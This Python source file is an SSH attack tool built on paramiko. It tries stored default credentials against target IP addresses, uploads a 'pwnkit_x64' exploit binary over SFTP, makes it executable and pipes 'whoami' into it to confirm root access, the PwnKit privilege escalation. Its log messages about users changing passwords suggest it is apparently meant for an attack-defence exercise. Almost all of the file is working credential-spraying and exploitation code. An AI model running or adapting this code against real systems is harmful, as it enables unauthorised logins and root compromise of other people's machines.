import paramiko
from BetterLogger import logger

COLOR_OKGREEN = '\033[92m'
COLOR_OKBLUE = '\033[94m'
COLOR_FAIL = '\033[91m'
COLOR_END = '\033[0m'

class UserIP:
	def __init__(self, ip_address, credentials):
		self.ip_address = ip_address
		self.got_root = False
		self.credentials = credentials

	def __repr__(self) -> str:
		"""
		Represent the Object as a string
		"""
		return f"{type(self).__name__}({self.ip_address})"

	def __check_login(self, username, password, is_sudo_user, exploit_pwnkit=True):
		"""
		Returns True if we successfully got root, and returns False otherwise
		"""
		try:
			got_root = False
			logger.info(f"Connecting to {username}@{self.ip_address}...")
			ssh_client = paramiko.SSHClient()
			ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			ssh_client.connect(self.ip_address, username=username, password=password, timeout=5)
			logger.info(f"{COLOR_OKGREEN}Successfully connected to {username}@{self.ip_address}{COLOR_END}")

			if is_sudo_user:
				got_root = True
			elif exploit_pwnkit: # only attempt to exploit pwnkit if we're not already a sudo user
				got_root = self.exploit_pwnkit(ssh_client=ssh_client, username=username)

			ssh_client.close()
			return got_root
		except paramiko.AuthenticationException as err:
			logger.info(f"{COLOR_FAIL}Failed to connect to {username}@{self.ip_address}. The user most likely changed their password!{COLOR_END}")
			return False
		except Exception as err:
			logger.info(f"{COLOR_FAIL}Failed to connect to {username}@{self.ip_address}{COLOR_END}")
			return False

	def exploit_pwnkit(self, ssh_client, username):
		"""
		Exploits pwnkit over an existing SSH connection
		"""
		logger.info("Copying pwnkit_x64 binary over SSH...")
		sftp = ssh_client.open_sftp()
		pwnkit_binary_name = "pwnkit_x64"
		sftp.put(localpath=f"./binaries/{pwnkit_binary_name}", remotepath=f"/home/{username}/{pwnkit_binary_name}", confirm=True)
		logger.info(f"Successfully copied {pwnkit_binary_name} binary over SSH")
		sftp.close()

		logger.info("Setting the pwnkit binary to be executable...")
		ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"chmod +x ./{pwnkit_binary_name}")
		logger.info("Successfully set the pwnkit binary to be executable.")

		logger.info("Checking for root privileges...")
		ssh_stdin, ssh_stdout, ssh_stderr = ssh_client.exec_command(f"echo 'whoami' | ./{pwnkit_binary_name}")
		output_as_string = ssh_stdout.read().decode().strip()
		logger.debug(f"'whoami' output: {output_as_string}")
		ssh_client.close()

		if output_as_string == "root":
			logger.info(f"{COLOR_OKGREEN}Successfully got root on {username}@{self.ip_address}{COLOR_END}")
			return True
		else:
			logger.info(f"{COLOR_FAIL}Failed to get root, the system does not seem to be vulnerable to pwnkit{COLOR_END}")
			return False

	def check_all_logins(self, return_when_root=True):
		"""
		Tries to connect using all default credentials

		return_when_root: If set to False, all logins will be checked regardless of whether or not we successfully got root
		"""
		for credential in self.credentials:
			try:
				got_root = self.__check_login(username=credential["username"], password=credential["password"], is_sudo_user=credential["sudo_user"])
				if got_root:
					logger.info(f"{COLOR_OKBLUE}Successfully got root on {self.ip_address}{COLOR_END}")
					if return_when_root:
						break
			except Exception as err:
				pass
